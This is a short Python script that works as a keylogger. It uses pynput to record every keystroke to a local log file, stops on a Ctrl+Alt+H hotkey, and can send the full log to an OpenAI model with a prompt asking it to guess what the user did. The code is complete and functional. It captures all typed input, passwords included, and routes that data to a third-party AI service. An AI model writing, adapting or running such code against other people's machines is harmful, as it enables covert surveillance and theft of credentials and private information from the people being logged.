from pynput import *
import openai
import os
import time

client = openai.OpenAI(api_key=os.getenv("OPENAI_API_KEY"))

f = open("log.txt", "w")
logPath = "./log.txt"

def AIGuess():
    with open(logPath, "r") as file:
        logOutput = file.read()

    response = client.chat.completions.create(
        model="gpt-4o-mini-2024-07-18",
        messages=[
            {"role": "system", "content": "You are an AI that analyzes key logger data."},
            {"role": "user", "content": f"Attached is the output from a key logger: {logOutput}\n\nGive a short answer that contains assumptions of what the user might have done based on the key strokes."}
        ],
    )
    print(f"{response.choices[0].message.content}\n")
    print(f"Tokens used: Input = {response.usage.prompt_tokens}, Output = {response.usage.completion_tokens}, Total = {response.usage.total_tokens}\n")

print("Recording...")

def on_press(key):
    f.write(str(key) + ", ")

def on_release(key):
    pass

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

def endLogger():
    print(f"\nLogger terminated\nLog transcribed to: {logPath}")
    f.close()
    ynGuess = input("\nDo you want the AI to guess what the user did? y/n\n")
    if ynGuess == "y":
        print("\nAI Answer:")
        AIGuess()
        time.sleep(1)
    listener.stop()
    hotkeys.stop()
    exit()

hotkeys = keyboard.GlobalHotKeys({
    '<ctrl>+<alt>+h': endLogger
})
hotkeys.start()

listener.join()